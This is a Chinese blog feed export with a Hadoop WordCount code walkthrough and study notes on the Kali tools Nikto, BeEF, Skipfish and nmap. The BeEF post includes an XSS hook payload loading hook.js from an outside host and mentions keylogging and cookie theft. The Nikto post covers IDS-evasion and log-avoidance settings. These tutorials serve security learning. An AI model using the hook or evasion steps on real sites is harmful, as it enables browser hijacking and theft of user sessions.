<p><code>Configuration conf = new Configuration();</code></p>
<ul>
<li>运行mapreduce程序前都要初始化Configuration</li>
<li>该类主要是读取mapreduce系统配置信息，这些信息包括hdfs还有mapreduce，也就是安装hadoop时候的配置文件</li>
<li>例如：core-site.xml、hdfs-site.xml和mapred-site.xml等等文件里的信息</li>
</ul>
<blockquote>
<p>程序员开发mapreduce时候只是在填空，在map函数和reduce函数里编写实际进行的业务逻辑，其它的工作都是交给mapreduce框架自己操作的，但是至少我们要告诉它怎么操作啊，比如hdfs在哪里啊，mapreduce的jobstracker在哪里啊，而这些信息就在conf包下的配置文件里。</p>
</blockquote>
</li>
<li><p>代码02</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String[] otherArgs = <span class="keyword">new</span> GenericOptionsParser(conf, args).getRemainingArgs();</span><br><span class="line">    <span class="keyword">if</span> (otherArgs.length != <span class="number">2</span>) &#123;</span><br><span class="line">      System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; &lt;out&gt;"</span>);</span><br><span class="line">      System.exit(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>If的语句好理解，就是运行WordCount程序时候一定是两个参数，如果不是就会报错退出。</li>
<li>至于第一句里的GenericOptionsParser类，它是用来解释常用hadoop命令，并根据需要为Configuration对象设置相应的值（其实平时开发里我们不太常用它，而是让类实现Tool接口，然后再main函数里使用ToolRunner运行程序，而ToolRunner内部会调用GenericOptionsParser）</li>
</ul>
</li>
<li><p>代码03</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Job job = <span class="keyword">new</span> Job(conf, <span class="string">"word count"</span>);</span><br><span class="line">job.setJarByClass(WordCount.class);</span><br><span class="line">job.setMapperClass(TokenizerMapper.class);</span><br><span class="line">job.setCombinerClass(IntSumReducer.class);</span><br><span class="line">job.setReducerClass(IntSumReducer.class);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一行就是在构建一个job<ul>
<li>在mapreduce框架里一个mapreduce任务也叫mapreduce作业也叫做一个mapreduce的job，而具体的map和reduce运算就是task了</li>
<li>这里我们构建一个job，构建时候有两个参数，一个是conf，一个是这个job的名称</li>
</ul>
</li>
<li>第二行就是装载程序员编写好的计算程序<ul>
<li>例如我们的程序类名就是WordCount了。</li>
<li>虽然我们编写mapreduce程序只需要实现map函数和reduce函数，但是实际开发我们要实现三个类</li>
<li>第三个类是为了配置mapreduce如何运行map和reduce函数，准确的说就是构建一个mapreduce能执行的job了，例如WordCount类。</li>
</ul>
</li>
<li>第三行和第五行就是装载map函数和reduce函数实现类了，</li>
<li>第四行，这个是装载Combiner类，其实本例去掉第四行也没有关系，但是使用了第四行理论上运行效率会更好。</li>
</ul>
</li>
<li><p>代码04</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">job.setOutputKeyClass(Text.class);</span><br><span class="line">job.setOutputValueClass(IntWritable.class);</span><br></pre></td></tr></table></figure>
<ul>
<li>定义输出的key/value的类型，也就是最终存储在hdfs上结果文件的key/value的类型</li>
</ul>
</li>
<li><p>代码05</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[<span class="number">0</span>]));</span><br><span class="line">FileOutputFormat.setOutputPath(job, <span class="keyword">new</span> Path(otherArgs[<span class="number">1</span>]));</span><br><span class="line">System.exit(job.waitForCompletion(<span class="keyword">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>第一行就是构建输入的数据文件</li>
<li>第二行是构建输出的数据文件</li>
<li>最后一行如果job运行成功了，我们的程序就会正常退出。</li>
<li>FileInputFormat和FileOutputFormat可以设置输入输出文件路径，<ul>
<li>mapreduce计算时候，输入文件必须存在，要不直Mr任务直接退出。</li>
<li>输出一般是一个文件夹，而且该文件夹不能存在</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="3-4-总体代码解读"><a href="#3-4-总体代码解读" class="headerlink" title="3.4-总体代码解读"></a>3.4-总体代码解读</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * Licensed to the Apache Software Foundation (ASF) under one </span></span><br><span class="line"><span class="comment"> * or more contributor license agreements.  See the NOTICE file </span></span><br><span class="line"><span class="comment"> * distributed with this work for additional information </span></span><br><span class="line"><span class="comment"> * regarding copyright ownership.  The ASF licenses this file </span></span><br><span class="line"><span class="comment"> * to you under the Apache License, Version 2.0 (the </span></span><br><span class="line"><span class="comment"> * "License"); you may not use this file except in compliance </span></span><br><span class="line"><span class="comment"> * with the License.  You may obtain a copy of the License at </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *     http://www.apache.org/licenses/LICENSE-2.0 </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * Unless required by applicable law or agreed to in writing, software </span></span><br><span class="line"><span class="comment"> * distributed under the License is distributed on an "AS IS" BASIS, </span></span><br><span class="line"><span class="comment"> * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. </span></span><br><span class="line"><span class="comment"> * See the License for the specific language governing permissions and </span></span><br><span class="line"><span class="comment"> * limitations under the License. </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">package</span> org.apache.hadoop.examples;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.util.StringTokenizer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.conf.Configuration;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.fs.Path;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.IntWritable;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.io.Text;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Job;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Mapper;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.Reducer;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.input.FileInputFormat;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;  </span><br><span class="line"><span class="keyword">import</span> org.apache.hadoop.util.GenericOptionsParser;  </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WordCount</span> </span>&#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//四个参数，前两个为输入&lt;key,value&gt;对，后两个为输出&lt;key,value&gt;对;  </span></span><br><span class="line">    <span class="comment">//LongWritable、IntWritable、Text可视为Java 的long、int、String替代品;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">TokenizerMapper</span> <span class="keyword">extends</span> <span class="title">Mapper</span>&lt;<span class="title">Object</span>, <span class="title">Text</span>, <span class="title">Text</span>, <span class="title">IntWritable</span>&gt;</span>&#123;  </span><br><span class="line">            <span class="comment">//一个标记单词个数的常量，值为1，这个常量也可以不定义，在后面程序直接用整数1代替，private final static定义的是常量;  </span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> IntWritable one = <span class="keyword">new</span> IntWritable(<span class="number">1</span>);  </span><br><span class="line">        <span class="comment">//充当中间变量，存储词;  </span></span><br><span class="line">        <span class="keyword">private</span> Text word = <span class="keyword">new</span> Text();  </span><br><span class="line">        <span class="comment">//map方法，key为偏移量，对value进行拆分，&lt;span style="font-family: Arial, Helvetica, sans-serif;"&gt;context为上下文机制;&lt;/span&gt;  </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">map</span><span class="params">(Object key, Text value, Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;  </span><br><span class="line">            <span class="comment">//对转换的字符串进行分隔;   </span></span><br><span class="line">            StringTokenizer itr = <span class="keyword">new</span> StringTokenizer(value.toString());  </span><br><span class="line">                <span class="comment">//利用循环函数进行依次处理;  </span></span><br><span class="line">            <span class="keyword">while</span> (itr.hasMoreTokens()) &#123;  </span><br><span class="line">                <span class="comment">//返回从当前位置到下一个分隔符的字符串;       </span></span><br><span class="line">                word.set(itr.nextToken());  </span><br><span class="line">                <span class="comment">//如 context.write("hello",1);  </span></span><br><span class="line">                context.write(word, one);      </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">         &#125;  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">//四个参数，前两个为输入&lt;key,value&gt;对，后两个为输出&lt;key,value&gt;对;  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">IntSumReducer</span> <span class="keyword">extends</span> <span class="title">Reducer</span>&lt;<span class="title">Text</span>,<span class="title">IntWritable</span>,<span class="title">Text</span>,<span class="title">IntWritable</span>&gt; </span>&#123;  </span><br><span class="line">        <span class="comment">//定义一个变量;  </span></span><br><span class="line">            <span class="keyword">private</span> IntWritable result = <span class="keyword">new</span> IntWritable();  </span><br><span class="line">        <span class="comment">//reduce方法，key为如 "hello"，Iterable遍历所有key的个数;  </span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">reduce</span><span class="params">(Text key, Iterable&lt;IntWritable&gt; values,Context context)</span> <span class="keyword">throws</span> IOException, InterruptedException </span>&#123;  </span><br><span class="line">                <span class="comment">//  用于记录key个数的变量;  </span></span><br><span class="line">                    <span class="keyword">int</span> sum = <span class="number">0</span>;  </span><br><span class="line">            <span class="comment">//求key的个数;   </span></span><br><span class="line">                    <span class="keyword">for</span> (IntWritable val : values) &#123;  </span><br><span class="line">                                sum += val.get();  </span><br><span class="line">                    &#125;  </span><br><span class="line">            <span class="comment">//把sum个数存到result中去;  </span></span><br><span class="line">                    result.set(sum);  </span><br><span class="line">            <span class="comment">//如 context.write("hello",7);        </span></span><br><span class="line">                    context.write(key, result);  </span><br><span class="line">                &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//主方法;  </span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;  </span><br><span class="line">        <span class="comment">//指定作业执行规范;  </span></span><br><span class="line">            Configuration conf = <span class="keyword">new</span> Configuration();  </span><br><span class="line">            <span class="comment">//这里需要配置参数即输入和输出的HDFS的文件路径   </span></span><br><span class="line">        String[] otherArgs = <span class="keyword">new</span> GenericOptionsParser(conf, args).getRemainingArgs();  </span><br><span class="line">        <span class="keyword">if</span> (otherArgs.length &lt; <span class="number">2</span>) &#123;  </span><br><span class="line">                    System.err.println(<span class="string">"Usage: wordcount &lt;in&gt; [&lt;in&gt;...] &lt;out&gt;"</span>);  </span><br><span class="line">                System.exit(<span class="number">2</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">//设置Job名称、运行对象;  </span></span><br><span class="line">        Job job = <span class="keyword">new</span> Job(conf, <span class="string">"word count"</span>);  </span><br><span class="line">            job.setJarByClass(WordCount.class);  </span><br><span class="line">        <span class="comment">//为job设置map类;  </span></span><br><span class="line">        job.setMapperClass(TokenizerMapper.class);  </span><br><span class="line">        <span class="comment">//为job设置Combiner类;  </span></span><br><span class="line">        job.setCombinerClass(IntSumReducer.class);  </span><br><span class="line">        <span class="comment">//为job设置 reduce类;  </span></span><br><span class="line">        job.setReducerClass(IntSumReducer.class);  </span><br><span class="line">            <span class="comment">//设置输出key类型;  </span></span><br><span class="line">        job.setOutputKeyClass(Text.class);  </span><br><span class="line">        <span class="comment">//设置输出value类型;  </span></span><br><span class="line">        job.setOutputValueClass(IntWritable.class);  </span><br><span class="line">        <span class="comment">//设置输入路径;  </span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; otherArgs.length - <span class="number">1</span>; ++i) &#123;  </span><br><span class="line">                FileInputFormat.addInputPath(job, <span class="keyword">new</span> Path(otherArgs[i]));  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">//设置输出路径;  </span></span><br><span class="line">        FileOutputFormat.setOutputPath(job,<span class="keyword">new</span> Path(otherArgs[otherArgs.length - <span class="number">1</span>]));  </span><br><span class="line">        System.exit(job.waitForCompletion(<span class="keyword">true</span>) ? <span class="number">0</span> : <span class="number">1</span>);  </span><br><span class="line">     &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>其它</category>
      </categories>
      <tags>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-Nikto</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-Nikto/</url>
    <content><![CDATA[<h1 id="扫描工具之Nikto"><a href="#扫描工具之Nikto" class="headerlink" title="扫描工具之Nikto"></a>扫描工具之Nikto</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>perl语言开发，开源web扫描器</li>
<li>可以扫web服务器的软件版本，如apache，tomcat</li>
<li>web server也是其关注点，不仅仅针对代码层</li>
<li>搜索存在安全隐患的文件，如备份文件<ul>
<li>渗透是黑盒测试<a id="more"></a></li>
<li>若发现存在的源代码，白盒</li>
</ul>
</li>
<li>扫描服务器的配置漏洞<ul>
<li>默认配置不一定是安全配置</li>
<li>默认配置问题已列入top10，较严重</li>
</ul>
</li>
<li>web application层面的安全隐患，代码层面，如sql注入，xss</li>
</ul>
<h2 id="404误判问题"><a href="#404误判问题" class="headerlink" title="404误判问题"></a>404误判问题</h2><ul>
<li>web扫描器的根本任务是找到所有的页面，理想情况200和404来判断</li>
<li>很多服务器并不遵守RFC标准，对于不存在的对象也会返回200，因此扫描不准确</li>
<li>为解决上述问题，可以根据文件内容来判断，但是不同后缀的文件的404返回内容是不同的</li>
<li>为解决新问题，扫描目标前，会进行不同后缀名的尝试，得到其对应的返回内容<ul>
<li>所有扫描前的准备工作</li>
<li>后缀名存在于nikto的数据库中</li>
<li>随机名字加后缀拼接成文件名，去请求</li>
<li>这个文件是随机的，一定不会存在于目标</li>
<li>返回不存在时的信息</li>
<li>将信息中那些时间等动态信息去除，进行md5，得到不存在时的返回信息，视为一个标准</li>
<li>后面扫描时，将信息与不存在时返回的信息进行对比，从而准确判断</li>
</ul>
</li>
<li>-no404参数<ul>
<li>默认是不加的</li>
<li>避免前期尝试的准备工作，直接扫描</li>
<li>可以提高扫描效率</li>
<li>相应的会降低准确率</li>
<li>误判可能性大，不建议</li>
</ul>
</li>
</ul>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><ul>
<li>-update<ul>
<li>升级数据库及插件</li>
</ul>
</li>
<li>-list-plugins<ul>
<li>列出插件，笼统的大类</li>
</ul>
</li>
<li>-useproxy<ul>
<li>使用代理</li>
</ul>
</li>
<li>-host<ul>
<li>指定</li>
<li>可以是IP，也可以IP：port</li>
<li>可以域名，并指定目录</li>
<li>可跟文件，内含多个目标</li>
</ul>
</li>
<li>-port<ul>
<li>指定端口</li>
<li>默认扫描80</li>
<li>可跟多个端口</li>
</ul>
</li>
<li>-ssl<ul>
<li>ssl的模式</li>
</ul>
</li>
<li>结合nmap扫描<ul>
<li>nmap扫描结果作为其目标</li>
<li>利用Linux管道命令</li>
<li>nmap -p 80 192.168.1.1/24 -oG - | nikto -host -，-表示前者的结果</li>
</ul>
</li>
<li>-vhost<ul>
<li>指定虚拟主机</li>
<li>一个IP存在多个网站</li>
<li>只能跟域名，不可IP</li>
</ul>
</li>
</ul>
<h2 id="扫描时与用户交互"><a href="#扫描时与用户交互" class="headerlink" title="扫描时与用户交互"></a>扫描时与用户交互</h2><ul>
<li>空格，显示当前扫描状态</li>
<li>v，verbose，显示当前正在扫描的信息，再按关闭，下同</li>
<li>d，debug，更详细的信息</li>
<li>e，error，错误信息</li>
<li>p，progress，进程信息</li>
<li>r，redict，显示重定向</li>
<li>处，cookie显示cookie</li>
<li>ａ，auth，认证信息</li>
<li>q，推出扫描</li>
<li>N，下一个host，针对多个目标时</li>
<li>Ｐ，暂停</li>
</ul>
<h2 id="扫描时认证问题"><a href="#扫描时认证问题" class="headerlink" title="扫描时认证问题"></a>扫描时认证问题</h2><ul>
<li>很对扫描会有认证过程，成功后才可以进一步，如登录表单</li>
<li>两种认证方式<ul>
<li>基于webserver的，不常见，多见于嵌入式设备</li>
<li>基于web application，代码层面，如登录页面</li>
</ul>
</li>
<li>-id参数可解决基于webserver时的http认证，不适合代码层面</li>
<li>对于登录表单<ul>
<li>nikto本身不支持表单认证</li>
<li>可采取cookie方式，效果一样<ul>
<li>不提供相关参数来指定cookie</li>
<li>利用配置文件</li>
<li>浏览器登录表单，获取cookie</li>
<li>将cookie写入其配置文件</li>
<li>如此，就会携带cookie扫描，从而通过认证</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h2><ul>
<li>/etc/nikto.conf</li>
<li>修改user-agent<ul>
<li>躲避报警机制</li>
<li>避免目标日志记录实施攻击的具体工具</li>
</ul>
</li>
<li>修改cookie<ul>
<li>实现代码层的认证</li>
<li>每次扫描请求都会带着cookie去访问</li>
</ul>
</li>
<li>修改RFIURL<ul>
<li>测试远程文件包含</li>
<li>可修改为自己服务器上的</li>
</ul>
</li>
<li>CIRT<ul>
<li>更新时从这个IP获取信息</li>
<li>官方IP是需要翻墙的</li>
</ul>
</li>
<li>代理设置<ul>
<li>修改后，则不需要使用-useproxy</li>
<li>一个是临时，一个是永久</li>
</ul>
</li>
</ul>
<h2 id="躲避IDS技术"><a href="#躲避IDS技术" class="headerlink" title="躲避IDS技术"></a>躲避IDS技术</h2><ul>
<li>-evasion参数</li>
<li>共有8种方法，man nikto可见</li>
<li>可同时使用多个</li>
<li>以数字ID表示采取的方法</li>
<li>如-evasion 145</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-Beef</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-Beef/</url>
    <content><![CDATA[<h1 id="Web渗透-Beef"><a href="#Web渗透-Beef" class="headerlink" title="Web渗透_Beef"></a>Web渗透_Beef</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>browser exploitation framework</li>
<li>生成、交付payload（即自动生成js脚本，xss利用脚本</li>
<li>Ruby语言编写（msf也基于ruby</li>
<li>服务器端：管理hooked客户端<a id="more"></a><ul>
<li>一个web界面</li>
</ul>
</li>
<li>客户端：运行于客户端浏览器的js脚本（hook</li>
<li>大多白帽子，对js只有alert的水平，js代码编写能力差（即xss利用），beef可实现较大的自动化</li>
<li>beef不单针对xss，但对xss帮助的确很大</li>
</ul>
<h2 id="浏览器攻击面"><a href="#浏览器攻击面" class="headerlink" title="浏览器攻击面"></a>浏览器攻击面</h2><ul>
<li>应用普遍转移到B/S架构，浏览器成为统一客户端程序</li>
<li>结合社会工程学对浏览器进行攻击</li>
<li>攻击浏览器用户（攻击服务区端受阻时，很重要的一个攻击方向</li>
<li>通过注入的Js脚本，利用浏览器攻击其它网站</li>
</ul>
<h2 id="攻击手段"><a href="#攻击手段" class="headerlink" title="攻击手段"></a>攻击手段</h2><ul>
<li>利用网站xss漏洞实现攻击</li>
<li>诱使客户端访问含有hook的伪造站点</li>
<li>结合中间人攻击注入hook脚本</li>
</ul>
<h2 id="常见用途"><a href="#常见用途" class="headerlink" title="常见用途"></a>常见用途</h2><ul>
<li>键盘记录器</li>
<li>网络扫描（利用已hooked的主机对其进行内网扫描</li>
<li>浏览器信息扫描</li>
<li>绑定shell</li>
<li>可与metasploit集成</li>
</ul>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><ul>
<li>简单过程<ul>
<li>默认账号密码皆为beef，登录控制台界面</li>
<li><script>src=<a href="http://xxx/hook.js">http://xxx/hook.js</a></script>粘贴至存在xss处（dvwa存储型xss的留言板</li>
<li>回到控制台界面，发现主机已hooked</li>
<li>已Hooke 的的主机，在控制台可见许多信息（如cookie</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-Skipfish</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-Skipfish/</url>
    <content><![CDATA[<h1 id="扫描工具之Skipfish"><a href="#扫描工具之Skipfish" class="headerlink" title="扫描工具之Skipfish"></a>扫描工具之Skipfish</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><ul>
<li>命令行工具<ul>
<li>c语言编写</li>
<li>无代理功能，只可主动扫描</li>
</ul>
</li>
<li>实验性的主动web安全评估工具<ul>
<li>实验性，非商业版</li>
<li>Google的实验性项目不必其他商业软件差</li>
</ul>
</li>
<li>web application的代码层面<a id="more"></a></li>
<li>两种大方法<ul>
<li>给出，起始页面，递归爬网</li>
<li>基于字典的探测，做fuzz</li>
</ul>
</li>
<li>优势<ul>
<li>相对而言，误报较低</li>
<li>速度较快<ul>
<li>多路单线程，全异步网络i/o，消除内存管理和调度开销</li>
<li>启发式自动内容识别</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="常见使用"><a href="#常见使用" class="headerlink" title="常见使用"></a>常见使用</h2><ul>
<li>-o test 目标URL<ul>
<li>o参数指定结果输出的目录，必须的参数</li>
</ul>
</li>
<li>-o test @url.txt<ul>
<li>指定多个目标</li>
</ul>
</li>
<li>-o test -S complete.wl -W a.wl 目标URL<ul>
<li>一般是根据页面内容URL来递归爬取</li>
<li>可能会有隐藏的，故S参数指定字典，基于字典的扫描</li>
<li>W参数，扫描出目录及其他特征字符，指定文件来存放，方便后续使用</li>
</ul>
</li>
<li>I参数，只检查包含某字符串的URL<ul>
<li>规定扫描范围</li>
</ul>
</li>
<li>X参数，不检查包含某字符串的URL<ul>
<li>如logout</li>
</ul>
</li>
<li>K不对指定的参数进行fuzz测试</li>
<li>D参数，跨站点爬另一个域<ul>
<li>扫描过程中通过网页内容的超链接可能会得到其他域名的网页，会超出测试范围，不应扫描</li>
<li>有时，也需要去扫描<ul>
<li>如，网页存在嵌套，a网页中有b域名的网页</li>
<li>前提是扫描时通过网页内容的超链接得到了其他域名的网站，没有得到，出于测试范围，也不会去扫描</li>
</ul>
</li>
<li>K参数指定了需要扫描的其他域名，指定了且爬取得到的才可以扫描，并且关系，缺一不可</li>
</ul>
</li>
<li>速度相关<ul>
<li>l，每秒最大请求数</li>
<li>m，每个IP最大并发连接数</li>
<li>避免触发报警机制</li>
</ul>
</li>
<li>—config，指定配置文件<ul>
<li>不用每次加这么多参数</li>
<li>一次修改，多次使用</li>
</ul>
</li>
</ul>
<h2 id="身份认证相关"><a href="#身份认证相关" class="headerlink" title="身份认证相关"></a>身份认证相关</h2><ul>
<li>目标服务器需要http基本身份认证，web server层面<ul>
<li>A参数，如-A user:pass</li>
</ul>
</li>
<li>扫描时遇到登录页面，web application 代码层面<ul>
<li>cookie方法<ul>
<li>C参数，如-C “k1=v1” -C “k2=v2”</li>
</ul>
</li>
<li>表单登录方法<ul>
<li>—auth-form<ul>
<li>表单所在的URL</li>
</ul>
</li>
<li>—auth-user<ul>
<li>提交的用户名</li>
</ul>
</li>
<li>—auth-pass<ul>
<li>提交的密码</li>
</ul>
</li>
<li>—auth-verify-url<ul>
<li>登录成功后跳转的URL，用于验证登录是否成功</li>
</ul>
</li>
<li>其他三个相关参数，使登录更准确，提高登录成功率<ul>
<li>—auth-form-target<ul>
<li>form表单的action内容</li>
<li>注意是绝对路径</li>
</ul>
</li>
<li>—auth-user-field<ul>
<li>form表单中用户名字段</li>
</ul>
</li>
<li>—auth-pass-field<ul>
<li>密码字段名称</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Web安全/渗透</category>
      </categories>
      <tags>
        <tag>tool</tag>
        <tag>Kali</tag>
        <tag>Web渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali实战-nmap</title>
    <url>/2018/01/27/web/Kali%E5%AE%9E%E6%88%98-nmap/</url>
    <content><![CDATA[<h1 id="主动信息收集-nmap"><a href="#主动信息收集-nmap" class="headerlink" title="主动信息收集_nmap"></a>主动信息收集_nmap</h1><h2 id="target-specification"><a href="#target-specification" class="headerlink" title="target specification"></a>target specification</h2><ul>
<li>-iL<ul>
<li>-iL ip.txt</li>
<li>从文件中获取待扫描的IP</li>
</ul>
</li>
<li>-iR<ul>
<li>-iR 100:随机选取100个IP</li>
<li>随机选取，不用非得自己网段，世界各地的<a id="more"></a></li>
</ul>
</li>
<li>—exclude/excludefile<ul>
<li>—exclude 1.1.1.1-30</li>
<li>排除掉指定的的IP（或IP段</li>
<li>excludefile，即排除文件中的IP</li>
</ul>
</li>
</ul>
<h2 id="host-discovery"><a href="#host-discovery" class="headerlink" title="host discovery"></a>host discovery</h2><ul>
<li>-sL<ul>
<li>不做扫描，仅把待扫描的IP列出来（或列出ip.txt中目标，意义不大</li>
<li>-sL x.x.x.0/28，即列出16个地址</li>
<li>功能类似子网掩码计算IP个数</li>
</ul>
</li>
<li>-sn<ul>
<li>不做端口扫描</li>
<li>用于主机发现层面</li>
</ul>
</li>
<li>-Pn<ul>
<li>跳过主机发现阶段（认为所有主机都存活</li>
<li>扫描防火墙时常用到</li>
<li>目标中存在防火墙等特殊设备，若不加-Pn，在主机发现时，其没有回包，nmap以为其主机不存活，故不进行下一步的端口扫描，但其上可能存在某开放端口，因此会错过这一存活主机</li>
</ul>
</li>
<li>-PS/PA/PU/PY<ul>
<li>利用tcp syn/ack和udp和sctp</li>
<li>sctp不是tcp/ip范畴内的协议</li>
</ul>
</li>
<li>-PE/PP/PM<ul>
<li>ICMP echo，timestap，netmask</li>
<li>netmask查对方的子网掩码，很少查到，除非安全性很烂</li>
</ul>
</li>
<li>-P0<ul>
<li>IP协议ping的扫描</li>
</ul>
</li>
<li>-n/-R<ul>
<li>-n：禁止做dns解析（包括域名到IP的正向解析和IP到已经的逆向</li>
<li>-R：总对目标IP实施dns的逆向解析</li>
</ul>
</li>
<li>—dns-servers<ul>
<li>在做dns解析时，自定义dns服务器</li>
<li>如新浪有智能dns功能，中国访问与美国访问，得到的IP是不同的</li>
<li>自定义dns即可模拟不同地区访问目标</li>
</ul>
</li>
<li>—system-dns<ul>
<li>使用系统自带的dns，加不加无所谓</li>
</ul>
</li>
<li>—traceroute<ul>
<li>扫描时进行路由追踪</li>
<li>类似traceroute命令</li>
</ul>
</li>
</ul>
<h2 id="scan-technique（针对端口扫描的技术"><a href="#scan-technique（针对端口扫描的技术" class="headerlink" title="scan technique（针对端口扫描的技术"></a>scan technique（针对端口扫描的技术</h2><ul>
<li>-sS/sT/sA/sW/sM<ul>
<li>默认是tcp的syn扫描</li>
<li>sT是tcp connect，建立完整连接的扫描，结果较准确</li>
<li>sA便是tcp的ack扫描</li>
<li>sW是tcp中window，即窗口扫描</li>
<li>sM是maimon，也是tcp的范畴</li>
<li>皆是是tcp不同flag的组合，（如-sA为syn+ack，不确定）Wireshark抓包，分析其tcp结构中不同flag的组合，对应的哪个参数</li>
</ul>
</li>
<li>-sU<ul>
<li>udp扫描</li>
</ul>
</li>
<li>-sN/sF/sX<ul>
<li>tcp null ，FIN，Xmas</li>
<li>sN即无flag，flag位全为0</li>
</ul>
</li>
<li>—scanflags<ul>
<li>前面的很多参数，都是tcp的不同flag组合，nmap自带的</li>
<li>若不满已有的，可自定义flag组合</li>
<li>也不是随意组合的，要很懂网络，自己搭配的flag能够判断目标状态，否则无意义</li>
</ul>
</li>
<li>-sI<ul>
<li>僵尸机扫描</li>
</ul>
</li>
<li>-sY/sZ<ul>
<li>针对SCTP的，SCTP INIT/COOKIE-ECHO</li>
<li>用的不多，不常见</li>
</ul>
</li>
<li>-sO<ul>
<li>IP协议的扫描</li>
</ul>
</li>
<li>-b<ul>
<li>ftp bounce 扫描，ftp中继的场景</li>
</ul>
</li>
</ul>
<h2 id="port-specification-and-scan-order"><a href="#port-specification-and-scan-order" class="headerlink" title="port specification and scan order"></a>port specification and scan order</h2><ul>
<li>指定要扫什么端口</li>
<li>-p<ul>
<li>指定扫描的端口</li>
<li>可以单个端口，可以-表连续端口，可以,表不连续端口</li>
<li>可以指定是tcp端口还是udp端口，若不指定，则默认两种全选</li>
<li>举例<ul>
<li>-p53</li>
<li>-p1-65535</li>
<li>-p U:53,111,137, T:21-25,80</li>
</ul>
</li>
</ul>
</li>
<li>—exclude-ports<ul>
<li>排除指定端口</li>
</ul>
</li>
<li>-F<ul>
<li>快速扫描模式</li>
<li>如不加p指定端口，则会扫描默认的1000个常用端口，若加F，则会扫描较少的端口</li>
</ul>
</li>
<li>-r<ul>
<li>连续扫描端口，按数字顺序</li>
<li>默认情况下是随机的，不按数字顺序的</li>
</ul>
</li>
<li>—top-ports<ul>
<li>不加任何端口扫描相关的参数时，默认扫描目标机器的1000个常用端口</li>
<li>若—top-ports 10，则只扫1000中前10个</li>
</ul>
</li>
<li>—port-ratio<ul>
<li>用的不多，自行查阅</li>
</ul>
</li>
